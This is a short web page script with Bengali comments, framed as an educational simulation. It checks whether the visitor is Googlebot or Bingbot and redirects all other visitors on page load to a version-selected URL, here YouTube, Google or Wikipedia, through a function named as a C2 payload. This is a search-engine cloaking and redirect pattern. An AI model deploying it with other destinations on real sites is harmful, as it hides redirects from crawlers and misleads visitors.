<script>
// ================================================================
// ⚠️ Educational simulation: Only secure domains are used here.
// ================================================================

var CURRENT_PAYLOAD_VERSION = "v1";   // 👈 এখানে বদলালেই version switch

window.C2_PAYLOAD_ACTION = function() {

    // 🛡️ ধাপ ১: Bot চেক
    if (navigator.userAgent.includes('Googlebot') || 
        navigator.userAgent.includes('Bingbot')) {
        console.log("Thanks for visiting my page");
        return;   // ← Bot হলে এখানেই থেমে যাবে
    }
    
    // 🌐 ধাপ ২: URL define
    var REDIRECT_URL_V1 = "https://www.youtube.com";     // V1: Video
    var REDIRECT_URL_V2 = "https://www.google.com";      // V2: Search
    var REDIRECT_URL_V3 = "https://www.wikipedia.org";   // V3: Information
    
    if (CURRENT_PAYLOAD_VERSION === "v1") {
        window.location.href = REDIRECT_URL_V1;    // 🔁 YouTube
    } 
    else if (CURRENT_PAYLOAD_VERSION === "v2") {
        window.location.href = REDIRECT_URL_V2;    // 🔁 Google
    } 
    else if (CURRENT_PAYLOAD_VERSION === "v3") {
        window.location.href = REDIRECT_URL_V3;    // 🔁 Wikipedia
    }
    else {
        console.log("Thanks for visiting my page");
    }
};

// ================================================================
if (!navigator.userAgent.includes('Googlebot') && 
    !navigator.userAgent.includes('Bingbot')) {
    window.C2_PAYLOAD_ACTION();  
} else {
    console.log("Skipping action.");
}
</script>
